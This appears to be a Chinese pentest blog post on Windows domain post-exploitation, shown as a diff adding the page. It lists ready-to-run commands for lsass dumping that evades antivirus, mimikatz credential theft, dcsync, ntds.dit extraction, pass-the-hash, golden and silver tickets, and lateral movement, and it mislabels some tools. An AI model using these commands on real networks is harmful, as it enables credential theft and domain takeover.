@@ -1,0 +1,884 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>内网基础（持续更新...） - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网基础（持续更新...）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-03 04:00" pubdate>
+        February 3, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      51
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网基础（持续更新...）</h1>
+            
+            <div class="markdown-body">
+              <h1 id="内网渗透-基础-第一版"><a href="#内网渗透-基础-第一版" class="headerlink" title="内网渗透(基础)-第一版"></a>内网渗透(基础)-第一版</h1><p>我们假定你已经拿下一台普通权限的机器，这台机器也许处在DMZ(外部网站)，也许运气好就在内网域环境里，渗透情况总是复杂多样的，现在我们开始内网渗透，目标拿下域管理员,实现完全控制，这就是所谓的后渗透，让我们开始吧。</p>
+<ul>
+<li><p>域环境介绍</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></p>
+</blockquote>
+</li>
+<li><p>域环境一般构成：</p>
+<ul>
+<li>PDC（主域控制器）+ SDC（次域控）+ Exchange（邮件服务器）+ DataCentre（共享服务器）+ PC<h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="基本信息："><a href="#基本信息：" class="headerlink" title="基本信息："></a>基本信息：</h3></li>
+</ul>
+</li>
+<li><p>权限 - <code>whoami -all</code></p>
+</li>
+<li><p>ip信息 - <code>ipconfig</code></p>
+</li>
+<li><p>开放端口及服务 - <code>netstat -ano</code></p>
+</li>
+<li><p>edr(杀软) - <code>cd C:\Program Files &amp; dir</code> 和 <code>cd C:\Program Files (x86)&amp;&amp;dir</code></p>
+</li>
+<li><p>进程 - <code>tasklist /v</code></p>
+</li>
+<li><p>系统信息 - <code>systeminfo</code></p>
+</li>
+<li><p>查看当前登录用户 - <code>quser</code></p>
+</li>
+<li><p>账户信息：</p>
+  <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user<br><span class="hljs-keyword">net</span> localgroup<br><span class="hljs-keyword">net</span> accounts<br><span class="hljs-keyword">net</span> localgroup administrators<br><span class="hljs-keyword">net</span> localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>服务信息 - <code>sc query</code></p>
+</li>
+<li><p>然后桌面啥的翻一翻，万一有密码呢~</p>
+<h3 id="提权信息："><a href="#提权信息：" class="headerlink" title="提权信息："></a>提权信息：</h3></li>
+<li><p>查看安装补丁的版本 - <code>wmic qfe</code></p>
+<h3 id="凭证信息"><a href="#凭证信息" class="headerlink" title="凭证信息"></a>凭证信息</h3></li>
+<li><p><code>mimikatz dpapi</code></p>
+<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><h3 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h3></li>
+<li><p>首先执行命令 <code>wmic qfe</code> 查看补丁版本，寻找没有被修补的漏洞</p>
+</li>
+<li><p><strong><em>juicy potato</em></strong>工具生成exp：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a> </p>
+</blockquote>
+</li>
+<li><p>编译完成上传到目标执行，执行完成后使用 <code>whoami</code> 查看是否是 <code>administrator</code> 权限</p>
+<h3 id="第三方提权："><a href="#第三方提权：" class="headerlink" title="第三方提权："></a>第三方提权：</h3></li>
+<li><p>MySQL - UDF提权</p>
+</li>
+<li><p>MSSQL - <code>root</code> 权限可以通过 <code>xp_cmdshell</code> 执行命令</p>
+</li>
+<li><p>各种web应用服务，比如Tomcat，在web目录部署webshell。</p>
+</li>
+<li><p>总之寻找高权限第三方服务</p>
+<h3 id="系统提权："><a href="#系统提权：" class="headerlink" title="系统提权："></a>系统提权：</h3><ul>
+<li>未引用服务目录</li>
+<li>dll注入</li>
+<li>越权文件替换</li>
+</ul>
+</li>
+</ul>
+<h2 id="域信息收集："><a href="#域信息收集：" class="headerlink" title="域信息收集："></a>域信息收集：</h2><h3 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery :"></a>dsquery :</h3><ul>
+<li>dsquery 是windows服务器自带的查询工具，可以查询出域内所有的信息，注意：**<em>只能在域机器上或经过认证的域用户使用**</em>，可远程查询。</li>
+<li>基本用法：<code>dsquery * -limit 0(不加的话默认导出前100条) -filter (内容是过滤器) -attr (内容是导出的项目) dc= (域名，有几级域名就加几个 dc，例如 hello.org =&gt; dc=hello dc=org）</code></li>
+<li>导出域信任关系 : <code>dsquery * -filter (objectClass=trusteddomain) &gt; trust.txt</code></li>
+<li>导出域用户信息: <code>dsquery * -limit 0 -filter (objectclass=user) -attr * &gt; user.txt</code> </li>
+<li>导出域用户信息的指定属性: <code>dsquery * -limit 0 -filter objectclass=user -attr name pwdLastSet sAMAccountName mail &gt; user.txt</code></li>
+<li>查询指定用户信息：<code>dsquery * -limit 0 -filter &amp;(objectclass=user)(sAMAccountName=John) -attr * &gt; user.txt</code> </li>
+<li>查询所有 adminCount 为1的账户(大概率为域管账户，但如果曾今是也是1): <code>dsquery * -filter &quot;(&amp;(objectClass=user)(adminCount=1))&quot; -attr * -l -limit 0 &gt; user.txt</code></li>
+<li>导出域用户组信息：`dsquery * -limit 0 -filter objectclass=group -attr * &gt; group.txt</li>
+<li>导出域计算机信息：<code>dsquery * -filter objectclass=computer -attr * &gt; computer.txt</code></li>
+<li>远程连接域控：<code>dsquery * dc=hello,dc=org -attr * -l -limit 0 -s 10.24.15.1 -u EXCHLAB\Administrator -p VMPassw0rd!! &gt; full.txt</code><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2></li>
+</ul>
+<ul>
+<li>横向移动（远程执行命令）是内网渗透的重中之重，一开始获取权限的或许只是普通机器，可能需要很多次横向移动才能抓到域管账号。<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3></li>
+</ul>
+<ul>
+<li><p>执行命令： <code>wmic /node:10.1.1.1 /user:administrator /password:admin123 process call create &quot;cmd /c whoami &gt; 1.txt&quot;</code></p>
+</li>
+<li><p>注意：</p>
+<ol>
+<li>wmic需要域管理员权限才能在别人电脑上执行命令哦</li>
+<li>如果此时正有人在登录，wmic会弹窗<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3></li>
+</ol>
+</li>
+<li><p>执行命令：<code>schtasks /create /s 1.1.1.1 /u administrator /p admin123 /tn hhh(任务名字) /sc once(执行次数) /tr &quot;cmd /c whoami &gt; 1.txt&quot;</code></p>
+</li>
+<li><p>注意：<br>  1.schtasks同样需要域管理员权限<br>  2.schtasks将以system权限执行命令</p>
+<h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3></li>
+<li><p>windows server 默认开启的服务，可以使用winrs客户端执行命令</p>
+</li>
+<li><p>可以复用80，443端口做持久化</p>
+</li>
+</ul>
+<h3 id="其余的工具"><a href="#其余的工具" class="headerlink" title="其余的工具"></a>其余的工具</h3><ul>
+<li>at</li>
+<li>psexec</li>
+<li>dcom</li>
+<li>rdp<h2 id="抓取凭证"><a href="#抓取凭证" class="headerlink" title="抓取凭证"></a>抓取凭证</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3></li>
+<li>宇宙最强奇异果，内网渗透神器，建议搞懂，可以从内存中读出用户的密码明文或者哈希</li>
+<li>注意: 右键以管理员权限运行</li>
+<li><strong><em>注意！！</em></strong>：<ol>
+<li>使用 mimikatz 时注意看其支持的系统版本，如果在不支持的系统版本上执行通常会导致机器重启</li>
+<li>mimikatz 20190813 版在 Windows Server 2016 的 DC 服务器上使用失败，重启</li>
+</ol>
+</li>
+<li>使用：<ul>
+<li><p><code>mimikatz privilege::debug</code> ：万事先提权</p>
+</li>
+<li><p><code>sekurlsa::logonPasswords</code> : 抓取在这台电脑上登录过的域用户的密码以及本地密码（内存中的）</p>
+</li>
+<li><p>抓明文：</p>
+<ol>
+<li><p>自 Windows 8.1 及 Windows Server 2012 R2 开始，内存就不再存储 LM Hash 及明文密码了，旧版本的 Windows 打上 kb2871997 补丁也会实现相同的功能，如果这时候还想让系统存储明文密码就需要修改下注册表：</p>
+<blockquote>
+<p><code>reg add \\DC1.EXCHLAB.ORG\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest  /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
+</blockquote>
+</li>
+<li><p>修改成功之后不必重启，之后登录 Windows 的账户明文密码就可以通过抓内存抓到了<br>然而，这个注册表项一般会被防御软件监控，所以除非没办法了，否则别碰！</p>
+</li>
+</ol>
+</li>
+<li><p>mimikatz在目标上极易被杀，所以我们采取另一种办法，上传微软签名的工具 <code>procdump</code> 拷贝内存，考回本机，用mimikatz加载：</p>
+<ol>
+<li>使用procdump导内存： <code>procmon.exe -accepteula -ma lsass.exe C:\Windows\Temp\debug.dmp</code></li>
+<li>使用mimikatz加载： <code>mimikatz.exe &quot;sekurlsa::minidump C:\Windows\Temp\debug.dmp&quot; &quot;sekurlsa::logonPasswords&quot;</code></li>
+</ol>
+</li>
+<li><p>抓取本地：</p>
+<ul>
+<li>导出注册表：<ol>
+<li><code>reg save \\DC1.EXCHLAB.ORG\HKLM\SAM C:\Windows\Temp\SAM.HIVE</code></li>
+<li><code>reg save \\DC1.EXCHLAB.ORG\HKLM\SYSTEM C:\Windows\Temp\SYSTEM.HIVE</code></li>
+<li>拖回本地：<code>mimikatz.exe &quot;lsadump::sam /sam:C:\sam.hive /system:C:\system.hive&quot; exit</code></li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>记录明文：mimikatz 通过向 Windows SSP (Security Support Provider) 打内存补丁的方式，将所有认证时传入的帐号密码记录到文件 C:\Windows\System32\mimilsa.log 中，重启失效</p>
+<blockquote>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;misc::memssp&quot; exit</code></p>
+</blockquote>
+</li>
+<li><p>抓取全域：</p>
+<ul>
+<li><p>dcsyns：</p>
+<blockquote>
+<p><code>lsadump::dcsync /domain:pentestlab.local /all /csv</code></p>
+</blockquote>
+</li>
+<li><p>lsadump::lsa:</p>
+<blockquote>
+<p><code>privilege::debug log \&quot;lsadump::lsa /inject</code></p>
+</blockquote>
+</li>
+<li><p>ntdsdump: 导出ntds.dit数据库文件，也可以导出全域密码(建议rdp导出)</p>
+<ol>
+<li><p>一般c盘么的权限拷贝，需要先创建快照：</p>
+<blockquote>
+<p><code>vssadmin create shadow /for=C:</code></p>
+</blockquote>
+</li>
+<li><p>复制数据库文件</p>
+ <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">&gt; copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\b</span>ackup.db<br>&gt; copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>YSTEM C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\T</span>emp<span class="hljs-symbol">\s</span>ystem.db<br></code></pre></td></tr></table></figure></li>
+<li><p>使用 impacket的secretdump套件读取hash</p>
+<blockquote>
+<p><code>impacket-secretsdump -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL</code></p>
+</blockquote>
+<ul>
+<li>secretsdump：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py</a></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>注意：创建快照的操作会被记录，可以使用 <code>Invoke-NinjaCopy</code> 工具，不过该工具会被windows defender拦截。<h2 id="票据和哈希"><a href="#票据和哈希" class="headerlink" title="票据和哈希"></a>票据和哈希</h2><h3 id="哈希传递："><a href="#哈希传递：" class="headerlink" title="哈希传递："></a>哈希传递：</h3>win2008之后的版本密码就以hash储存而不存明文，前面mimikatz抓取的一般为 <code>NTLM hash</code> 。除了basic认证，域环境内的一种身份认证方式是 <code>NTLM hash认证</code>。采用问询/应答身份验证协议。<blockquote>
+<p>NTLM身份认证： <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39353923/article/details/82599014">https://blog.csdn.net/qq_39353923/article/details/82599014</a></p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>注：域内认证方式：<ol>
+<li>basic认证（账户密码）</li>
+<li>NTLM认证</li>
+<li>Negotiate认证（票据）</li>
+</ol>
+</li>
+</ul>
+<p>所以我们可以在拥有mimikatz抓取的hash的情况下进行 <code>PTH</code> 攻击（哈希传递攻击），可伪装任意拥有hash的用户。</p>
+<blockquote>
+<p><code>mimikatz sekurlsa::pth /user:administrtor /domain:hello.org /ntlm: /run:cmd.exe</code></p>
+</blockquote>
+<ul>
+<li>弹出的cmd框中执行的命令都会使用提供的ntlm进行认证。<h3 id="票据传递："><a href="#票据传递：" class="headerlink" title="票据传递："></a>票据传递：</h3>票据认证是微软的另一种认证方式，用到的是著名的 <code>kerberos</code> 认证。</li>
+</ul>
+<p><img src="http://47.75.197.183/ss/kerberos.png" srcset="/img/loading.gif" alt="avatar"></p>
+<ul>
+<li><p>黄金票据：域中分发的票据是使用域用户 <code>krbtgt</code> 的hash加密的，当我们拥有krbtgt的hash后，就可以生成任意票据。</p>
+<blockquote>
+<p><code>mimikatz &quot;kerberos::golden /user:Administrator /domain:hello.org /sid:S-1-5-21-1016690176-3112175478-3511132709 /krbtgt:7492c3058483dc019379647210fb5dae /dc:DC1.hello.org /ptt</code></p>
+</blockquote>
+<ul>
+<li>注意，<code>sid</code> 为域的sid，即用户sid去掉最后的一块。</li>
+<li>应用场景：黄金票据必须有krbtgt的hash，这需要同步过全域的hash，意味着以曾拿过域管，所以一般应用在域管权限丢失后（改密码）重新拿回域管。krbtgt用户的密码一般不会改。</li>
+</ul>
+</li>
+<li><p>白银票据：</p>
+<p>  在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了。当拥有服务（比如 http,smb等）的hash，我们就可以伪造票据访问任意服务。</p>
+<ul>
+<li>白银票据不需要与KDC交互！</li>
+<li>比如攻击exchange机器：<ul>
+<li><p>需要拿到exchange机器的机器hash。</p>
+<blockquote>
+<p><code>mimikatz &quot;kerberos::golden /admin:Administrator /domain:EXCHLAB.ORG /sid:S-1-5-21-1016690176-3112175478-3511132709 /target:EXCH.hello.org /rc4:498031189eaa18a1308f36221903dad7 /service:HTTP /ptt</code></p>
+</blockquote>
+</li>
+<li><p><code>klist</code> 查看导入的票据。</p>
+</li>
+<li><p>成功后即可以任意用户访问exchange服务，无需经过域控认证。</p>
+<h2 id="口令攻防"><a href="#口令攻防" class="headerlink" title="口令攻防"></a>口令攻防</h2></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>很多情况下因为杀软的存在是不能直接上mimikatz抓到内存的，有的杀软（某巴斯基）甚至会保护进程，这时候就需要我们用别的方法了</p>
+<ul>
+<li><p>procdump</p>
+<pre><code>+ 这个就不解释了，上面说过了，微软签名的工具
+</code></pre>
+</li>
+<li><p>sqldump</p>
+<ul>
+<li><p>mssql自带的dump内存的工具，位置</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\1</span>00<span class="hljs-symbol">\S</span>hared<br></code></pre></td></tr></table></figure>
+<p>命令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Sqldumper</span>.exe ProcessID <span class="hljs-number">0</span> <span class="hljs-number">0</span>x<span class="hljs-number">01100</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>comsvcs.dll</p>
+<ul>
+<li><p>直接利用windows自带的dll，完美过杀软</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">.<span class="hljs-symbol">\r</span>undll32.exe C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>omsvcs.dll, MiniDump 624 C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\l</span>sass.dmp full	<br></code></pre></td></tr></table></figure>
+<h3 id="绕过内存保护"><a href="#绕过内存保护" class="headerlink" title="绕过内存保护"></a>绕过内存保护</h3></li>
+</ul>
+</li>
+<li><p>蓝屏：<a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2000.html">https://www.mrwu.red/web/2000.html</a>    <a target="_blank" rel="noopener" href="http://www.aiyuanzhen.com/index.php/archives/211/">http://www.aiyuanzhen.com/index.php/archives/211/</a></p>
+</li>
+<li><p>ssp注入：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangshen1990/article/details/104872566">https://blog.csdn.net/xiangshen1990/article/details/104872566</a></p>
+</li>
+</ul>
+<h2 id="域提权"><a href="#域提权" class="headerlink" title="域提权"></a>域提权</h2><p>当你拥有一台普通的域权限机器后，接下来要做的就是提升到域管理员权限。</p>
+<h3 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h3><p>mimikatz 的 logonpasswords模块只能抓到在本机登陆过的域账户，所以利用抓到的凭证进行横向移动，也许就能遇到域控登陆过的机器。</p>
+<h3 id="GPP漏洞"><a href="#GPP漏洞" class="headerlink" title="GPP漏洞"></a>GPP漏洞</h3><p>当域控为win2008时，域管通过 GPP（组策略）修改域成员的信息会保存在域内共享文件中，可破解得到明文密码。</p>
+<ul>
+<li><p>xml路径：<code>\\dc.hello.org\SYSVOL\hello.org\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\group.xml</code>(polices后面的路径不同，可通过域信息的gplinkl查找)</p>
+</li>
+<li><p>在kali内的 <code>gpp-decrypt</code> 工具解密该加密文件，获得明文。</p>
+<blockquote>
+<p><code>ds-crypt &quot;...&quot;</code></p>
+</blockquote>
+<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>经典提权漏洞，exp编译后运行即可，版本很老，一般会修复。</p>
+<h3 id="spn爆破"><a href="#spn爆破" class="headerlink" title="spn爆破"></a>spn爆破</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11707776.html">https://www.cnblogs.com/zpchcbd/p/11707776.html</a></p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联,服务实例可以为其主机的每个名称或别名注册 SPN。<br>因为服务账户一般具有高权限，所以扫描spn也是提权的可行手段。*<strong>**<em>任何域用户都可以向任何域服务请求TGS</em></strong>。</p>
+</blockquote>
+<ul>
+<li>利用步骤：<ol>
+<li>扫描spn</li>
+<li>根据SPN请求TGS</li>
+<li>导出TGS_ticket（mimikatz）</li>
+<li>TGS_ticket默认rc4加密，爆破即可获得服务用户密码</li>
+</ol>
+</li>
+</ul>
+<h2 id="其余内网攻击方式"><a href="#其余内网攻击方式" class="headerlink" title="其余内网攻击方式"></a>其余内网攻击方式</h2><ul>
+<li><p>kerberos委派 </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
+</blockquote>
+</li>
+<li><p>ntlm中继 </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202842.html">https://www.freebuf.com/column/202842.html</a></p>
+</blockquote>
+</li>
+<li><p>WPAD</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6824">http://www.vuln.cn/6824</a></p>
+</blockquote>
+</li>
+<li><p>arp欺骗</p>
+</li>
+<li><p>爆破smb</p>
+</li>
+<li><p>Sharepoint rce</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197770">https://www.anquanke.com/post/id/197770</a></p>
+</blockquote>
+</li>
+<li><p>Exchange SSRF + NTLM Relay + Exchange ACL</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194514">https://www.anquanke.com/post/id/194514</a></p>
+</blockquote>
+</li>
+<li><p>Exchange View_state 隐藏后门</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/20/0302/01/68828020_896063583.shtml">http://www.360doc.com/content/20/0302/01/68828020_896063583.shtml</a></p>
+</blockquote>
+</li>
+<li><p>Exchange利用方法</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/exchange-server-in-pentest/">https://blog.riskivy.com/exchange-server-in-pentest/</a></p>
+</blockquote>
+</li>
+<li><p>…</p>
+<p>  (o’w’o) 暂时懒得写了，等有空了再介绍上述攻击⑧ ~</p>
+</li>
+</ul>
+<h2 id="SMB签名和LDAP签名"><a href="#SMB签名和LDAP签名" class="headerlink" title="SMB签名和LDAP签名"></a>SMB签名和LDAP签名</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194514">https://www.anquanke.com/post/id/194514</a></p>
+</blockquote>
+<h3 id="关于签名"><a href="#关于签名" class="headerlink" title="关于签名"></a>关于签名</h3><p>客户端和服务器端开启签名将使用一个key加密操作，以防止NTLM_relay攻击（攻击者看不见内容）这个key由客户端生成，叫做exportedkey，然后用key_exchangekey作为密钥加密，（keyexchange是有用户与服务端共同计算协商的）得到encryptedkey，作为sessionkey字段传给服务端。</p>
+<h3 id="smb签名"><a href="#smb签名" class="headerlink" title="smb签名"></a>smb签名</h3><p>在域内的默认设置是仅在域控制器上启用，域成员机器并没有启用</p>
+<h3 id="LDAP签名"><a href="#LDAP签名" class="headerlink" title="LDAP签名"></a>LDAP签名</h3><p>在默认情况底下，ldap服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名。也就是说是否签名是有客户端决定的。服务端跟客户端协商是否签名。微软公司于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。</p>
+<h2 id="Exchange-SSRF-NTLM-Relay-Exchange-ACL"><a href="#Exchange-SSRF-NTLM-Relay-Exchange-ACL" class="headerlink" title="Exchange SSRF + NTLM Relay + Exchange ACL"></a>Exchange SSRF + NTLM Relay + Exchange ACL</h2><p>很棒的攻击，所以写一下</p>
+<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><ul>
